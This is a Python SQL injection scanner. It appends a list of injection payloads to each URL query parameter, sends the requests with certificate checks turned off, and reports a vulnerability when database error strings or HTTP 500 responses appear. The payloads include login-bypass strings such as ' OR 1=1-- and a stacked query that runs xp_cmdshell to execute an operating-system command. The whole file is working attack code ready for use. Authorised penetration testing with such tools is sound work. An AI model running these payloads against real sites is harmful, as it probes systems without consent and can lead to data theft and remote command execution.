import requests
import urllib.parse

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax error",
    "near",
    "syntax error",
    "invalid query",
    "mysql_fetch",
    "mysqli_fetch",
    "pg_query",
]

PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    '" OR "1"="1',
    "admin' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "'; EXEC xp_cmdshell('whoami') --",
]

def is_vulnerable(response_text):
    return any(err in response_text.lower() for err in ERROR_SIGNATURES)

def scan_sql_injection(url):
    results = []

    # Parse URL to extract parameters
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    if not query:
        return "❌ No query parameters to test for SQLi."

    # Test each parameter individually
    for param in query:
        original_value = query[param][0]
        for payload in PAYLOADS:
            tampered_params = query.copy()
            tampered_params[param] = original_value + payload
            tampered_query = urllib.parse.urlencode(tampered_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{tampered_query}"

            try:
                response = requests.get(test_url, timeout=5, verify=False)
                if is_vulnerable(response.text):
                    return f"🔥 SQL Injection vulnerability detected in parameter '{param}' using payload: {payload}"
                elif response.status_code == 500:
                    return f"🚨 Potential blind SQL Injection in parameter '{param}' (server error with payload: {payload})"
            except Exception as e:
                continue

    return None
